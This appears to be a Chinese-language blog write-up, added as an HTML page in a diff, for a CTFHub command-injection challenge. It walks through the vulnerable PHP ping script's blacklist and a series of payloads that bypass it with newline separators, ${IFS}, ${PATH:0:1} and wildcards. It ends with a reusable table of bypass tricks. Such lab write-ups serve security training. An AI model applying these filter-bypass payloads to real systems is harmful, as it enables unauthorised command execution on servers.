@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-RCE 命令注入-综合过滤练习 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .note { background-color: #fff5b1; padding: 10px; border-left: 5px solid #f1c40f; margin: 15px 0; border-radius: 3px; font-size: 0.95em; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.95em; }
+        th, td { border: 1px solid #dfe2e5; padding: 8px 12px; text-align: left; }
+        th { background-color: #f6f8fa; }
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-RCE 命令注入-综合过滤练习 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, RCE, 命令注入, 综合过滤, 终极组合拳</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - RCE / 综合过滤练习</li>
+        <li><strong>题目名称：</strong>综合过滤练习</li>
+        <li><strong>环境：</strong>浏览器 + Burp Suite 社区版（Repeater 模块）。</li>
+        <li><strong>目标：</strong>在过滤了运算符、空格、目录分隔符、关键字的极端环境下，组合利用各种替代符，实现任意命令执行。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>命令注入中所有常见过滤的综合绕过，以及如何打出“终极组合拳”。</p >
+    
+    <div class="diff-box">
+        <strong>知识点（比喻说明）：</strong>
+        <ul>
+            <li><strong>终极组合拳的必要性：</strong> 这一关把之前所有小节的过滤规则（空格、`/`、`cat`、`flag`、`;` 等）全部叠加在了一起。就像一个浑身都是铠甲、只露出一点缝隙的敌人，我们必须用最精准的武器组合，从缝隙中完成致命一击。</li>
+            <li><strong>武器库大合集：</strong> `%0a` 代替分号、`${IFS}` 代替空格、`base64` 代替 cat、`${PATH:0:1}` 代替斜杠、`*` 绕过关键字。每一招都是针对特定黑名单的“见招拆招”。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：源码审计与黑名单分析</h3>
+        <pre><code>&lt;?php
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?&gt;</code></pre>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)</code>：这是极其严格的黑名单。过滤了管道符 `|`、与符 `&`、分号 `;`、空格 ` `、斜杠 `/`，以及字符串 `cat`、`flag`、`ctfhub`。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：绕过分隔符与空格探测目录</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1%0als</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span>因为 `;`、`|`、`&` 都被禁用了，使用 URL 编码的换行符 `%0a` 代替分号。因为是在 Burp Repeater 中直接修改原始 URL，所以 `%0a` 不会被二次编码。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>成功列出文件，发现 <code>flag_is_here</code> 目录和 <code>index.php</code>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：使用通配符绕过关键字探测目标</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1%0als${IFS}f*_is_here</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span>为了绕过 <code>flag</code> 和空格的关键字过滤，使用 <code>${IFS}</code> 代替空格，使用通配符 <code>f*_is_here</code> 让 Linux 自动匹配 <code>flag_is_here</code> 目录。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>找到真正的目标文件 <code>flag_145631528524119.php</code>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：终极组合拳读取源码</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1%0abase64${IFS}f*_is_here${PATH:0:1}*</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span></p >
+        <ul>
+            <li><code>%0a</code>：换行执行下一条命令。</li>
+            <li><code>base64</code>：替代被过滤的 <code>cat</code>，强制编码，防止 PHP 源码被浏览器隐藏。</li>
+            <li><code>${IFS}</code>：替代空格。</li>
+            <li><code>f*_is_here</code>：绕过 <code>flag</code> 关键字，匹配目录名。</li>
+            <li><code>${PATH:0:1}</code>：截取 PATH 环境变量的第一个字符，等价于斜杠 <code>/</code>，绕过斜杠过滤。</li>
+            <li><code>*</code>：自动匹配目录下的所有文件。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">回显结果：</span>得到 Base64 字符串 <code>PD9waHAgLy8gY3RmaHVie2JmZjFkMWYzYmFhMzlkMzQ5NDkzMW... </code></p >
+        <p class="info-line"><span class="info-label">操作：</span> 将字符串复制到在线工具 <a href="https://base64.us" target="_blank">https://base64.us</a> 进行解码。</p >
+        <p class="info-line"><span class="info-label">解码结果：</span><code>&lt;?php // ctfhub{bff1d1f3baa39d34954931a}</code></p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘（血泪经验）</h2>
+    <ul>
+        <li><b>浏览器输入框的二次编码陷阱：</b> 尝试在网页输入框中直接输入 <code>%0a</code> 时，浏览器会将其自动编码为 <code>%250a</code>（即 `%` 被转义），导致服务器收到的只是普通字符串而非换行符，命令无法分隔。教训：遇到换行符、空字节截断等特殊字符时，必须使用 Burp Suite 拦截原始请求，在 Repeater 中手动修改 URL 发送。</li>
+        <li><b>通配符的精准使用：</b> 直接使用 <code>f*</code> 可能会匹配到多个同前缀文件导致报错。使用 <code>f*_is_here</code> 可以精确缩小匹配范围，确保系统能唯一匹配到目标目录。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <div class="note">
+        <strong>【命令注入绕过对照表】</strong><br>
+        在经过这六关的洗礼后，总结出以下实战常用的绕过映射表，以后遇到类似情况可直接套用：
+    </div>
+    <table>
+        <thead>
+            <tr>
+                <th>被过滤的目标</th>
+                <th>替代方案</th>
+                <th>举例</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>命令分隔符（<code>;</code> <code>|</code> <code>&</code>）</td>
+                <td><code>%0a</code>（换行符）</td>
+                <td><code>127.0.0.1%0als</code></td>
+            </tr>
+            <tr>
+                <td>空格</td>
+                <td><code>${IFS}</code>、<code>&lt;</code></td>
+                <td><code>cat${IFS}/flag</code></td>
+            </tr>
+            <tr>
+                <td>斜杠 <code>/</code></td>
+                <td><code>${PATH:0:1}</code>、<code>cd</code> 相对路径</td>
+                <td><code>cat${PATH:0:1}flag</code></td>
+            </tr>
+            <tr>
+                <td>命令 <code>cat</code></td>
+                <td><code>tac</code>、<code>nl</code>、<code>base64</code>、<code>ca?</code></td>
+                <td><code>base64&lt;flag.php</code></td>
+            </tr>
+            <tr>
+                <td>关键字 <code>flag</code></td>
+                <td>通配符 <code>*</code>、<code>?</code> 或变量拼接</td>
+                <td><code>f*_is_here</code>、<code>fla?</code></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
